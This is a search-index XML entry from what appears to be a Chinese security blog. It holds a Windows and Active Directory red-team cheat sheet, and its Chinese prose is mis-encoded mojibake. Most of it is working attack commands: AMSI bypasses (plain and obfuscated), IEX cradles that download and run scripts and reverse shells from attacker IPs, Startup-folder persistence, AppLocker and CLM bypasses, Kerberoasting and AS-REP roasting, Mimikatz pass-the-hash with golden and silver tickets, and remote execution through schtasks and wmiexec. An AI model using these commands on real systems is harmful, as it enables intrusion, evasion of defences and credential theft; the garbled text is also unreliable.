<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Windowså’ŒActive Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ]]></title>
    <url>%2F2021%2F05%2F19%2FWindows%E5%92%8CActive%20Directory%E5%A4%87%E5%BF%98%E5%8D%95%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83.html</url>
    <content type="text"><![CDATA[Windowså’ŒActive Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒGeneralPowerShell AMSI Bypassä¿®è¡¥AMSIå°†æœ‰åŠ©äºŽç»•è¿‡æ‰§è¡Œæ ‡è®°ä¸ºæ¶æ„çš„PowerShellè„šæœ¬ï¼ˆä¾‹å¦‚PowerViewï¼‰æ—¶è§¦å‘çš„AVè­¦å‘Šã€‚è¯·å‹¿åœ¨ç§˜å¯†æ“ä½œä¸­æŒ‰åŽŸæ ·ä½¿ç”¨ï¼Œå› ä¸ºå®ƒä»¬ä¼šè¢«æ ‡è®°flagã€‚é€šè¿‡æ›´æ”¹è„šæœ¬ä»¥èƒœè¿‡åŸºäºŽç­¾åçš„æ£€æµ‹ï¼Œå¯ä»¥æ··æ·†ç”šè‡³æ›´å¥½åœ°å®Œå…¨æ¶ˆé™¤AMSIç»•è¿‡çš„éœ€è¦ã€‚ â€˜Plainâ€™ AMSI bypass: 1[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) ç”¨äºŽå¤åˆ¶ç²˜è´´çš„æ··æ·†ç¤ºä¾‹ï¼š 1sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "&#123;1&#125;&#123;0&#125;"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "&#123;6&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "&#123;0&#125;&#123;2&#125;&#123;1&#125;" -f'amsi','d','InitFaile' ),( "&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( $&#123;n`ULl&#125;,$&#123;t`RuE&#125; ) å¦ä¸€ä¸ªæ—è·¯ï¼ŒPowerShellè‡ªåŠ¨è®°å½•æœªæ£€æµ‹åˆ°ï¼š 1[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True) æ›´å¤šç»•è¿‡ç‚¹å‡»è¿™é‡Œã€‚å¯¹äºŽæ··æ·†ï¼Œè¯·æ£€æŸ¥Invoke-Obfuscationï¼Œæˆ–åœ¨amsi.failä¸ŠèŽ·å–é¢„å…ˆç”Ÿæˆçš„æ··æ·†ç‰ˆæœ¬ã€‚ PowerShell one-linersåå°„å¼åŠ è½½PowerShellè„šæœ¬ä»£ç†æ„ŸçŸ¥ï¼š 1IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1') ä¸äº†è§£ä»£ç†ï¼š 1$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText åŒæ ·ï¼Œè¿™å¯èƒ½ä¼šè¢«æ ‡è®°flagã€‚æœ‰å…³opsecå®‰å…¨çš„ä¸‹è½½é€šè®¯åº§ï¼Œè¯·æŸ¥çœ‹Invoke-CradleCrafterã€‚ åå°„å¼åŠ è½½Cï¼ƒç¨‹åºé›†åœ¨è¿è¡Œè¯¥ç±»ä¹‹å‰ï¼Œè¯·ç¡®ä¿æ‰€å¼•ç”¨çš„ç±»å’Œmainæ–¹æ³•ä¸ºPublicã€‚è¯·æ³¨æ„ï¼Œä¸ºæ­¤å¯èƒ½éœ€è¦å…¨è¿‡ç¨‹çš„AMSIæ—è·¯ï¼Œæœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚è§æ­¤å¤„ã€‚ 12345678910111213141516# Download and run assembly without arguments$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')$assem = [System.Reflection.Assembly]::Load($data)[rev.Program]::Main("".Split())# Download and run Rubeus, with arguments$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')$assem = [System.Reflection.Assembly]::Load($data)[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())# Execute a specific method from an assembly (e.g. a DLL)$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')$assem = [System.Reflection.Assembly]::Load($data)$class = $assem.GetType("ClassLibrary1.Class1")$method = $class.GetMethod("runner")$method.Invoke(0, $null) ä¸‹è½½æ–‡ä»¶123456# Any version(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")# Powershell 4+## You can use 'IWR' as a shorthandInvoke-WebRequest "http://10.10.16.7/Incnspc64.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe" ç¼–ç å‘½ä»¤ç¼–ç ä¸€çº¿ï¼š 123$command = 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)$encodedCommand = [Convert]::ToBase64String($bytes) æˆ–ä»¥ä¸Šç‰ˆæœ¬çš„Linuxï¼š 1echo 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0 å¯¹çŽ°æœ‰è„šæœ¬è¿›è¡Œç¼–ç ï¼Œç„¶åŽå¤åˆ¶åˆ°å‰ªè´´æ¿ï¼š 1[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\path\to\PowerView.ps1')) | clip è¿è¡Œå®ƒï¼Œç»•è¿‡æ‰§è¡Œç­–ç•¥ã€‚ 1Powershell -EncodedCommand $encodedCommand å¦‚æžœæ‚¨æ–¹ä¾¿ä½¿ç”¨Nishangï¼Œåˆ™å¯ä»¥ä½¿ç”¨Invoke-Encode.ps1ã€‚ æžšä¸¾ä½¿ç”¨PowerViewè¿›è¡ŒADæžšä¸¾123456789101112131415161718192021222324252627282930313233343536373839404142434445# èŽ·å–å½“å‰åŸŸä¸­çš„æ‰€æœ‰ç”¨æˆ·Get-NetUser | select -ExpandProperty cn# èŽ·å–å½“å‰åŸŸä¸­çš„æ‰€æœ‰è®¡ç®—æœºGet-NetComputer# èŽ·å–å½“å‰æž—ä¸­çš„æ‰€æœ‰åŸŸGet-NetForestDomain# èŽ·å–åŸŸ/æž—ä¿¡ä»»Get-NetDomainTrustGet-NetForestTrust# èŽ·å–DAç»„çš„ä¿¡æ¯Get-NetGroup -GroupName "Domain Admins"# æŸ¥æ‰¾DAç»„çš„æˆå‘˜Get-NetGroupMember -GroupName "Domain Admins" | select -ExpandProperty membername# åœ¨åŸŸä¸­æŸ¥æ‰¾æœ‰è¶£çš„å…±äº«ï¼Œå¿½ç•¥é»˜è®¤å…±äº«Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC# èŽ·å–å½“å‰åŸŸçš„OUGet-NetOU -FullData# åœ¨OUä¸­èŽ·å–è®¡ç®—æœº# %&#123;&#125; æ˜¯å¾ªçŽ¯è¯­å¥Get-NetOU -OUName StudentMachines | %&#123;Get-NetComputer -ADSPath $_&#125;# èŽ·å–é€‚ç”¨äºŽç‰¹å®šOUçš„GPOGet-NetOU *student* | select gplinkGet-NetGPO -Name "&#123;3E04167E-C2B6-4A9A-8FB7-C811158DC97C&#125;"# èŽ·å–é€šè¿‡GPOè®¾ç½®çš„å—é™ç»„ï¼ŒæŸ¥æ‰¾é€šè¿‡åŸŸå¼ºåˆ¶è®¾ç½®çš„æœ‰è¶£ç»„æˆå‘˜èº«ä»½Get-NetGPOGroup# èŽ·å–ç‰¹å®šå¯¹è±¡çš„ä¼ å…¥ACLGet-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights# æŸ¥æ‰¾æ•´ä¸ªåŸŸçš„æœ‰è¶£ACLï¼Œä»¥å¯è¯»ï¼ˆä»Žå·¦åˆ°å³ï¼‰æ ¼å¼æ˜¾ç¤ºFind-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?&#123;$_.IdentityReferenceName -NotContains "DnsAdmins"&#125; | ft# èŽ·å–ç‰¹å®šç”¨æˆ·æˆ–ç»„çš„æœ‰è¶£çš„ä¼ å‡ºACL# ?&#123;&#125; æ˜¯ä¸€ä¸ªè¿‡æ»¤å™¨è¯­å¥Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.IdentityReference -match "Domain Admins"&#125; | select ObjectDN,ActiveDirectoryRights AppLockerè¯†åˆ«AppLockerç­–ç•¥ã€‚å¯»æ‰¾å…é™¤çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è¦ç»•è¿‡çš„è·¯å¾„ã€‚ 1Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections ä¸€äº›é«˜çº§ç»•è¿‡æŠ€æœ¯ï¼š å¦‚æžœä»…å…è®¸ä½¿ç”¨ï¼ˆMicrosoftï¼‰ç­¾åçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨LOLBASã€‚ å¦‚æžœC:\Windowså…è®¸æ¥è‡ªçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¯·å°è¯•å°†æ‚¨çš„äºŒè¿›åˆ¶æ–‡ä»¶æ‹–æ”¾åˆ°C:\Windows\Tempæˆ–C:\Windows\Tasksã€‚å¦‚æžœæ­¤ç›®å½•æ ‘ä¸­æ²¡æœ‰å¯å†™çš„å­ç›®å½•ï¼Œä½†å­˜åœ¨å¯å†™æ–‡ä»¶ï¼Œåˆ™å°†æ–‡ä»¶å†™å…¥å¤‡ç”¨æ•°æ®æµï¼ˆä¾‹å¦‚JScriptè„šæœ¬ï¼‰ï¼Œç„¶åŽä»Žé‚£é‡Œæ‰§è¡Œå®ƒã€‚ å°†æ‚¨çš„äºŒè¿›åˆ¶æ–‡ä»¶åŒ…è£…åœ¨DLLæ–‡ä»¶ä¸­ï¼Œç„¶åŽæ‰§è¡Œrundll32ä»¥ç»•è¿‡å¯æ‰§è¡Œè§„åˆ™ã€‚å¦‚æžœå…è®¸ä½¿ç”¨Pythonä¹‹ç±»çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨è¯¥æ–‡ä»¶ã€‚å¦‚æžœè¿™ä¸èµ·ä½œç”¨ï¼Œè¯·å°è¯•å…¶ä»–æŠ€æœ¯ï¼Œä¾‹å¦‚å°†JScriptåŒ…è£…åœ¨HTAæ–‡ä»¶ä¸­æˆ–ä½¿ç”¨æ¥è¿è¡ŒXSLæ–‡ä»¶wmicã€‚ PowerShellå—é™è¯­è¨€æ¨¡å¼æœ‰æ—¶ï¼Œæ‚¨å¯èƒ½ä¼šå‘çŽ°è‡ªå·±å¤„äºŽæ‰§è¡Œçº¦æŸè¯­è¨€æ¨¡å¼ï¼ˆCLMï¼‰çš„PowerShellä¼šè¯ä¸­ã€‚ä¸ŽAppLockeré…å¯¹æ—¶ï¼Œé€šå¸¸æ˜¯è¿™ç§æƒ…å†µï¼ˆè¯·å‚è§ä¸Šæ–‡ï¼‰ã€‚ æ‚¨å¯ä»¥é€šè¿‡è½®è¯¢ä»¥ä¸‹å˜é‡æ¥èŽ·å–å½“å‰çš„è¯­è¨€æ¨¡å¼ï¼Œä»Žè€Œç¡®å®šè‡ªå·±å¤„äºŽå—é™è¯­è¨€æ¨¡å¼ã€‚FullLanguageå¯¹äºŽæ— é™åˆ¶çš„ä¼šè¯å’ŒConstrainedLanguageCLM ï¼Œå®ƒå°†è¯´ã€‚è¿˜æœ‰å…¶ä»–è¯­è¨€æ¨¡å¼ï¼Œåœ¨è¿™é‡Œæˆ‘å°†ä¸å†èµ˜è¿°ã€‚ 1$ExecutionContext.SessionState.LanguageMode CLMæž„æˆçš„çº¦æŸå°†é˜»æ­¢æ‚¨çš„è®¸å¤šåˆ©ç”¨å°è¯•ã€‚ä¸€ç§å¿«é€Ÿè€Œè‚®è„çš„ç»•è¿‡æ–¹æ³•æ˜¯ä½¿ç”¨å†…è”å‡½æ•°ï¼Œè¯¥å‡½æ•°æœ‰æ—¶ä¼šèµ·ä½œç”¨-å¦‚æžœä¾‹å¦‚whoamiè¢«é˜»æ­¢ï¼Œè¯·å°è¯•ä»¥ä¸‹æ“ä½œï¼š 1&amp;&#123;whoami&#125; LAPSæˆ‘ä»¬å¯ä»¥ä½¿ç”¨LAPSToolkit.ps1æ¥è¯†åˆ«åŸŸä¸­çš„å“ªäº›è®¡ç®—æœºä½¿ç”¨LAPSï¼Œä»¥åŠå…è®¸å“ªäº›åŸŸç»„è¯»å–LAPSå¯†ç ã€‚å¦‚æžœå±žäºŽæ­¤ç»„ï¼Œåˆ™ä¹Ÿå¯ä»¥ä½¿ç”¨æ­¤å·¥å…·èŽ·å–å½“å‰çš„LAPSå¯†ç ã€‚ 12345# èŽ·å–è¿è¡ŒLAPSçš„è®¡ç®—æœºåŠå…¶å¯†ç ï¼ˆå¦‚æžœå…è®¸æˆ‘ä»¬è¯»å–è¿™äº›å¯†ç ï¼‰Get-LAPSComputers# èŽ·å–å…è®¸è¯»å–LAPSå¯†ç çš„ç»„Find-LAPSDelegatedGroups ExploitationPowercatåå‘shellå¦‚æžœæ‚¨çš„Linuxæœºå£³æ²¡æœ‰åå‘å¤–å£³ï¼Œåˆ™å¯ä»¥é€‰æ‹©;ï¼‰ã€‚ 1powercat -l -p 443 -t 9999 æ¨ªå‘è¿åŠ¨ä½¿ç”¨PowerViewè¿›è¡Œæ¨ªå‘è¿åŠ¨æžšä¸¾1234567891011121314151617181920212223242526272829303132# æŸ¥æ‰¾ç”¨æˆ·çš„çŽ°æœ‰æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™ï¼ˆnoisy ðŸš©ï¼‰Find-LocalAdminAccess# é€šè¿‡PSè¿œç¨‹å¤„ç†ï¼ˆalso noisyðŸš©ï¼‰æŸ¥æ‰¾æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™ï¼Œéœ€è¦Find-PSRemotingLocalAdminAccess.ps1Get-NetComputer -Domain dollarcorp.moneycorp.local &gt; .\targets.txtFind-PSRemotingLocalAdminAccess -ComputerFile .\targets.txt dcorp-std355# ä¸ŽWMIç›¸åŒã€‚æ˜¯å¦éœ€è¦â€œ Find-WMILocalAdminAccess.ps1â€ï¼ˆä¼¼ä¹Žå·²ä»ŽNishangä¸­åˆ é™¤äº†ï¼‰ï¼ŸFind-WMILocalAdminAccess -ComputerFile .\targets.txtFind-WMILocalAdminAccess # Finds domain computers automatically# åœ¨æ‚¨å¯ä»¥è®¿é—®çš„æœºå™¨ä¸Šæœå¯»æœ‰è¶£çš„ç”¨æˆ·ä¼šè¯ (still noisy ðŸš©)Invoke-UserHunter -CheckAccess | ?&#123;$_.LocalAdmin -Eq True &#125;# å¯»æ‰¾ kerberoastable usersGet-DomainUser -SPN | select name,serviceprincipalname# å¯»æ‰¾ AS-REP roastable usersGet-DomainUser -PreauthNotRequired | select name# å¯»æ‰¾å¯ä»¥è®¾ç½®UserAccountControlæ ‡å¿—çš„ç”¨æˆ·## å¦‚æžœå¯ç”¨-ç¦ç”¨é¢„èº«ä»½éªŒè¯æˆ–æ·»åŠ SPNï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰Invoke-ACLScanner -ResolveGUIDs | ?&#123;$_.IdentityReferenceName -match "RDPUsers"&#125;# æŸ¥æ‰¾å¯ç”¨äº†æ— é™åˆ¶å§”æ´¾çš„æœåŠ¡å™¨## å¦‚æžœå¯ç”¨ï¼Œå¹¶ä¸”æ‚¨åœ¨æ­¤æœåŠ¡å™¨ä¸Šå…·æœ‰ç®¡ç†å‘˜æƒé™ï¼Œè¯·èŽ·å–ç”¨æˆ·TGTï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰Get-DomainComputer -Unconstrained# æŸ¥æ‰¾å¯ç”¨äº†çº¦æŸå§”æ´¾çš„ç”¨æˆ·æˆ–è®¡ç®—æœº## å¦‚æžœå¯ç”¨ï¼Œå¹¶ä¸”æ‚¨å…·æœ‰ç”¨æˆ·/è®¡ç®—æœºå“ˆå¸Œï¼Œè¯·ä»¥DAèº«ä»½è®¿é—®æœåŠ¡æœºï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegatetoGet-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto BloodHoundä½¿ç”¨Invoke-BloodHoundfromSharpHound.ps1æˆ–use SharpHound.exeã€‚ä¸¤è€…éƒ½å¯ä»¥åæ€åœ°è¿è¡Œï¼ŒæŠŠå®ƒä»¬æ”¾åˆ°è¿™é‡Œã€‚ 12345# å¦‚æžœæ‚¨ä¸å…³å¿ƒOpSecï¼Œè¯·è¿è¡Œæ‰€æœ‰æ£€æŸ¥ðŸš©Invoke-BloodHound -CollectionMethod All,GPOLocalGroup# Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts ðŸš©Invoke-BloodHound -CollectionMethod LoggedOn KerberoastingAutomaticä½¿ç”¨PowerViewï¼š 1Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" ä½¿ç”¨Hashcatç ´è§£å“ˆå¸Œï¼š 1hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule Manual123456789# è¯·æ±‚TGSè¿›è¡Œkerberoastableå¸æˆ·ï¼ˆSPNï¼‰Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"# å°†TGSè½¬å‚¨åˆ°ç£ç›˜Invoke-Mimikatz -Command '"kerberos::list /export"'# ä½¿ç”¨TGSRepCrackç ´è§£python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi Targeted kerberoasting by setting SPNæˆ‘ä»¬éœ€è¦ACLå†™å…¥æƒé™æ‰èƒ½ä¸ºè¯¥ç”¨æˆ·è®¾ç½®UserAccountControlæ ‡å¿—ï¼Œæœ‰å…³æœç´¢ï¼Œè¯·å‚è§ä¸Šæ–‡ã€‚ä½¿ç”¨PowerViewï¼š 1Set-DomainObject -Identity support355user -Set @&#123;serviceprincipalname='any/thing'&#125; AS-REP roastingèŽ·å–å¯ç„™çƒ¤ç”¨æˆ·çš„å“ˆå¸Œï¼ˆæœ‰å…³æœç´¢ï¼Œè¯·å‚è§ä¸Šæ–‡ï¼‰ã€‚ä½¿ç”¨ASREPRoast.ps1ï¼š 1Get-ASREPHash -UserName VPN355user ä½¿ç”¨Hashcatç ´è§£å“ˆå¸Œï¼š 1hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule é€šè¿‡ç¦ç”¨Kerberosé¢„èº«ä»½éªŒè¯è¿›è¡Œæœ‰é’ˆå¯¹æ€§çš„AS-REPæ¼«æ¸¸æˆ‘ä»¬éœ€è¦ACLå†™å…¥æƒé™æ‰èƒ½ä¸ºè¯¥ç”¨æˆ·è®¾ç½®UserAccountControlæ ‡å¿—ï¼Œæœ‰å…³æœç´¢ï¼Œè¯·å‚è§ä¸Šæ–‡ã€‚ä½¿ç”¨PowerViewã€‚ 1Set-DomainObject -Identity Control355User -XOR @&#123;useraccountcontrol=4194304&#125; Token Manipulationå¯ä»¥é€šè¿‡è®¡ç®—æœºä¸Šçš„ä¼šè¯/è¿è¡Œè¿›ç¨‹ä»Žå…¶ä»–ç”¨æˆ·æ¨¡ä»¿ä»¤ç‰Œã€‚é€šè¿‡ä½¿ç”¨ä¾‹å¦‚CobaltStrikeæ³¨å…¥åˆ°æ‰€è¿°è¿‡ç¨‹ä¸­å¯ä»¥å®žçŽ°ç±»ä¼¼çš„æ•ˆæžœã€‚ Incognito12345# åœ¨æœºå™¨ä¸Šæ˜¾ç¤ºä»¤ç‰Œ.\incognito.exe list_tokens -u# ä½¿ç”¨ç‰¹å®šç”¨æˆ·çš„ä»¤ç‰Œå¯åŠ¨æ–°è¿‡ç¨‹.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe å¦‚æžœæ‚¨ä½¿ç”¨Meterpreterï¼Œåˆ™å¯ä»¥å°†å†…ç½®çš„Incognitoæ¨¡å—ä¸Žä¸€èµ·ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨use incognitoç›¸åŒçš„å‘½ä»¤ã€‚ Invoke-TokenManipulation1234567891011# æ˜¾ç¤ºæœºå™¨ä¸Šçš„æ‰€æœ‰ä»¤ç‰ŒInvoke-TokenManipulation -ShowAll# ä»…åœ¨æœºå™¨ä¸Šæ˜¾ç¤ºå”¯ä¸€çš„ï¼Œå¯ç”¨çš„ä»¤ç‰ŒInvoke-TokenManipulation -Enumerate# ä½¿ç”¨ç‰¹å®šç”¨æˆ·çš„ä»¤ç‰Œå¯åŠ¨æ–°è¿‡ç¨‹Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"# ä½¿ç”¨å¦ä¸€ä¸ªè¿›ç¨‹çš„ä»¤ç‰Œå¯åŠ¨æ–°è¿›ç¨‹Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500 Mimikatz12345678# Overpass the hashsekurlsa::pth /user:Administrator /domain:domain.local /ntlm:[NTLMHASH] /run:powershell.exe# é»„é‡‘ç¥¨æ® (domain admin, w/ some ticket properties to avoid detection)kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt# ç™½é“¶ç¥¨æ® for a specific SPN with a compromised service / machine accountkerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.domain.local /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt å¯åœ¨æ­¤å¤„æ‰¾åˆ°ç”¨äºŽé“¶ç¥¨çš„å¯ç”¨SPNåˆ—è¡¨ã€‚è¿™é‡Œæä¾›äº†ä¸Žæ”»å‡»ç›¸å…³çš„SPNçš„å¦ä¸€ä¸ªä¸é”™çš„æ¦‚è¿°ã€‚ ä½¿ç”¨schtasksæ‰§è¡Œå‘½ä»¤éœ€è¦â€œä¸»æœºâ€ SPN åˆ›å»ºä»»åŠ¡ï¼š 12# æ³¨æ„å¼•å·ã€‚å¦‚æžœå¼•ç”¨å˜å¾—å¾ˆç—›è‹¦ï¼Œè¯·ä½¿ç”¨ç¼–ç çš„å‘½ä»¤ã€‚schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dcorp-dc.dollarcorp.moneycorp.local /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'" è§¦å‘å®ƒï¼š 1schtasks /RUN /TN "shell" /s dcorp-dc.dollarcorp.moneycorp.local ä½¿ç”¨WMIæ‰§è¡Œå‘½ä»¤éœ€è¦â€œä¸»æœºâ€å’Œâ€œ RPCSSâ€ SPN Windows1Invoke-WmiMethod win32_process -ComputerName dcorp-dc.dollarcorp.moneycorp.local -name create -argumentlist "powershell.exe -e $encodedCommand" Linux12345# ä½¿ç”¨passwordimpacket-wmiexec dcorp/student355:password@172.16.4.101# ä½¿ç”¨hashimpacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F1758503D54 ä½¿ç”¨PowerShell Remotingæ‰§è¡Œå‘½ä»¤éœ€è¦â€œ CIFSâ€ï¼Œâ€œ HTTPâ€å’Œâ€œ WSMANâ€ SPN è¿™ä¸ªæœ‰ç‚¹æ£˜æ‰‹ã€‚ä¸Šè¿°SPNçš„ç»„åˆå¯èƒ½æœ‰æ•ˆæˆ–æ— æ•ˆ-PowerShellä¹Ÿå¯èƒ½è¦æ±‚æä¾›å‡†ç¡®çš„FQDNã€‚ 123456789101112131415161718# åˆ›å»ºå‡­æ®ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œï¼ˆå¦‚æžœéœ€è¦ï¼ŒPTTä¸éœ€è¦ï¼‰# å¦‚æžœä¸ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œè¯·åœ¨ä»¥ä¸‹å‘½ä»¤ä¸­å¿½ç•¥-Credential $ Cred$SecPassword = ConvertTo-SecureString 'thePassword' -AsPlainText -Force$Cred = New-Object System.Management.Automation.PSCredential('CORP\username', $SecPassword)# è¿œç¨‹è¿è¡Œå‘½ä»¤ï¼ˆå¯ä»¥ä¸€å¯¹å¤šä½¿ç”¨ï¼ï¼‰Invoke-Command -Credential $Cred -ComputerName $computer -ScriptBlock &#123;whoami; hostname&#125;# ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½å¯åŠ¨ä¼šè¯ï¼ˆæç¤ºè¾“å…¥å¯†ç ï¼‰Enter-PsSession -Credential $Cred -ComputerName $computer -Credential dcorp\Administrator# åˆ›å»ºä¸€ä¸ªæŒä¹…ä¼šè¯ï¼ˆå°†è®°ä½å˜é‡ç­‰ï¼‰ï¼Œå°†è„šæœ¬åŠ è½½åˆ°è¯¥ä¼šè¯ä¸­ï¼Œç„¶åŽè¾“å…¥è¿œç¨‹ä¼šè¯æç¤º$sess = New-PsSession -Credential $CredInvoke-Command -Session $sess -FilePath c:\path\to\file.ps1Enter-PsSession -Session $sess# åœ¨æ´»åŠ¨çš„PowerShellè¿œç¨‹ä¼šè¯ä¹‹é—´å¤åˆ¶æ–‡ä»¶æˆ–ä»Žä¸­å¤åˆ¶æ–‡ä»¶Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess2 -Destination "C:\Users\dbprodadmin\documents\" ä¸å—é™åˆ¶çš„å§”æ‰˜å¯ä»¥åœ¨å‰ç«¯æœåŠ¡ï¼ˆä¾‹å¦‚IIS WebæœåŠ¡å™¨ï¼‰ä¸Šè®¾ç½®ï¼Œä»¥å…è®¸å®ƒä»£è¡¨ç”¨æˆ·å§”æ´¾åŸŸä¸­çš„ä»»ä½•æœåŠ¡ï¼ˆå‘åŽç«¯æœåŠ¡ï¼ˆä¾‹å¦‚MSSQLæ•°æ®åº“ï¼‰ï¼‰ã€‚ DACL UACå±žæ€§ï¼š TrustedForDelegation. Exploitationåœ¨è®¾ç½®äº†æ— é™åˆ¶å§”æ´¾çš„æœåŠ¡å™¨ä¸Šå…·æœ‰ç®¡ç†ç‰¹æƒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºå…·æœ‰è¿žæŽ¥çš„å…¶ä»–ç”¨æˆ·è½¬å‚¨TGTã€‚ä½¿ç”¨Mimikatzï¼š 12sekurlsa::tickets /exportkerberos::ptt c:\path\to\ticket.kirbi æˆ–ä¸ŽRubeusä¸€èµ·ä½¿ç”¨ 123.\Rubeus.exe klist.\Rubeus.exe dump /luid:0x5379f2 /nowrap.\Rubeus.exe ptt /ticket:doIFSDCC[...] å¦‚æžœè¯¥DCå®¹æ˜“å—åˆ°æ‰“å°æœºé”™è¯¯çš„å½±å“ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥èŽ·å¾—åŸŸæŽ§åˆ¶å™¨è®¡ç®—æœºå¸æˆ·çš„å“ˆå¸Œå€¼ã€‚åœ¨å…·æœ‰æ— é™åˆ¶å§”æ´¾çš„æœåŠ¡å™¨ä¸Šï¼Œä½¿ç”¨Rubeusç›‘è§†æ–°ç¥¨è¯ã€‚ 1.\Rubeus.exe monitor /interval:5 /nowrap ä»Žæ”»å‡»æœºä¸Šè¯±ä½¿åŸŸæŽ§åˆ¶å™¨ä½¿ç”¨æ‰“å°æœºé”™è¯¯è¿›è¡Œè¿žæŽ¥ã€‚ä»Žè¿™é‡ŒäºŒè¿›åˆ¶ã€‚ 1.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local DCçš„æœºå™¨å¸æˆ·çš„TGTåº”è¯¥åœ¨ç¬¬ä¸€ä¸ªä¼šè¯ä¸­å‡ºçŽ°ã€‚æˆ‘ä»¬å¯ä»¥ä¼ é€’æ­¤ç¥¨è¯ä»¥èŽ·å¾—DCSyncç‰¹æƒã€‚ 1.\Rubeus.exe ptt /ticket:doIFxTCCBc... 